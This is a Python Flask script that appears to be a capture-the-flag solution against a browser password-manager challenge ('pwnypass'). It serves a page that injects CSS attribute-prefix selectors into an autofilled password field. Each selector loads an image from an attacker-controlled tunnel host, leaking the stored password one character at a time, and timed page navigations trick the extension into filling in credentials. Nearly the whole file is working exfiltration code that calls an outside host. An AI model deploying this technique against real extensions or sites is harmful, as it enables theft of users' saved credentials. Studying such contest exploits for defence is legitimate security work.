from flask import Flask
from string import ascii_letters

app = Flask(__name__)

PAYLOAD = """
<form id=f><input type=text id=u value='hack'><input type=password id=p value='<style>{0}</style>'></form>
<script>
const delay = t => new Promise(r => setTimeout(r, t));
onload = async () => {{
    await delay(1000);
    window.location.assign("https://pwnypass.c.hc.lc/");
    p.dispatchEvent(new Event('change'));
    await delay(25);
    window.stop();
    await delay(300);
    window.location.assign("https://pwnypass.c.hc.lc/");
    f.dispatchEvent(new Event('submit'));
    await delay(25);
    window.stop();
    await delay(200);
    window.location.assign("https://pwnypass.c.hc.lc/login.php");
}};
</script>
"""

ORIGIN = "https://544cf8630a5897.lhr.life"
guessed_flag = "uiuctf{0h_no_th3_pwn1es_4r3"

def generate_style():
    style = ""
    for c in ascii_letters:
        style += f'[data-username="sigpwny"]~[data-password^="{guessed_flag}{c}"]{{background:url({ORIGIN}/guess/{ord(c)});}}'
    return style

@app.route("/")
def brute():
    #print('Payload sent:', str.format(PAYLOAD, generate_style()))
    return str.format(PAYLOAD, generate_style())

@app.route('/guess/<int:char>')
def guess(char):
    global guessed_flag
    guessed_flag += chr(char)
    print('Current flag:', guessed_flag)
    return 'this is not a valid image =)'

if __name__ == '__main__':
    app.run('0.0.0.0', debug=False, port=8000)